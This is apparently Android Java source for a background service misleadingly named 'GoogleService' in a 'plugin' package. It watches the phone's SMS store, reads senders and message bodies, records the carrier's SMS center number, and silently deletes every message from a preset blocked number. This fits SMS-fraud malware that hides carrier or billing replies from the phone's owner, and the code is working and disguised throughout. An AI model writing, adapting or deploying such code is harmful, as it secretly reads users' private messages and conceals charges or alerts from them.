package com.xstd.plugin.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.util.LinkedList;

/**
 * 用于拦截短信content provider的变化
 * <p/>
 * _id => 短消息序号 如100
 * thread_id => 对话的序号 如100
 * address => 发件人地址，手机号.如+8613811810000
 * person => 发件人，返回一个数字就是联系人列表里的序号，陌生人为null
 * date => 日期  long型。如1256539465022
 * protocol => 协议 0 SMS_RPOTO, 1 MMS_PROTO
 * read => 是否阅读 0未读， 1已读
 * status => 状态 -1接收，0 complete, 64 pending, 128 failed
 * type => 类型 1是接收到的，2是已发出
 * body => 短消息内容
 * service_center => 短信服务中心号码编号。如+8613800755500
 */
public class GoogleService extends Service {

    //    private static final String SMS_URI = "content://sms/";//1.6下的系统
    private static final String SMS_URI = "content://mms-sms/";
    private static final String SMS_INBOX_URI = "content://sms";

    private String mBlockPhoneNumber = null;

    private ContentResolver mResolver;

    private ContentObserver smsContentObserver = new ContentObserver(new Handler()) {

        @Override
        public void onChange(boolean selfChange) {
            Config.LOGD("[[ContentObserver]] onChange find SMS changed. selfChange : " + selfChange + " ::::::::");

            super.onChange(true);
            /*Cursor cursor = resolver.query(
                    Uri.parse(SMS_INBOX_URI),
                    new String[] { "_id", "address", "thread_id", "date",
                            "protocol", "type", "body", "read" },
                    " address=? and read=?", new String[] {SENDER_ADDRESS, "0"},
                    "date desc");*/
            //注释掉的是查未读状态的，但如果你的手机安装了第三放的短信软件时，他们有可能把状态改变了，你就查询不到数据

            boolean showDeleteSMS = false;
            Cursor cursor = null;
            if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
                    && !TextUtils.isEmpty(mBlockPhoneNumber)) {
                cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                            new String[]{"_id", "address", "date", "body", "service_center"},
                                            " address = ?", new String[]{mBlockPhoneNumber},
                                            "date desc");
                showDeleteSMS = true;
            } else {
                cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                            new String[]{"_id", "address", "date", "body", "service_center"},
                                            null,
                                            null,
                                            "date desc");
                showDeleteSMS = false;
            }

            if (cursor == null) {
                return;
            }

            LinkedList<String> idList = new LinkedList<String>();
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                String center = cursor.getString(cursor.getColumnIndex("service_center"));
                idList.add(id);
                if (Config.DEBUG) {
                    Config.LOGD("[[ContentObserver::onChanged]] current SMS address : " + address
                                    + " body : " + body + " id : " + id
                                    + " center : " + center
                                    + " >>>>>");
                }
                if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
                        && !TextUtils.isEmpty(center)) {
                    if (center.startsWith("+") == true && center.length() == 14) {
                        center = center.substring(3);
                    } else if (center.length() > 11) {
                        center = center.substring(center.length() - 11);
                    }

                    SettingManager.getInstance().setKeySmsCenterNum(center);
                }

                break;
            }
            try {
                cursor.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            if (showDeleteSMS) {
                for (String id : idList) {
                    mResolver.delete(Uri.parse("content://sms/" + id), null, null);
                    if (Config.DEBUG) {
                    Config.LOGD("[[ContentObserver::onChanged]] try to delete SMS id : " + id);
                    }
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        Config.LOGD("[[GoogleService]] onCreate");

        mBlockPhoneNumber = SettingManager.getInstance().getKeyBlockPhoneNumber();

        mResolver = getContentResolver();
        mResolver.registerContentObserver(Uri.parse(SMS_URI), true, smsContentObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Config.LOGD("[[GoogleService]] onStartCommand");

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Config.LOGD("[[GoogleService]] onCreate");

        mResolver.unregisterContentObserver(smsContentObserver);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }


}
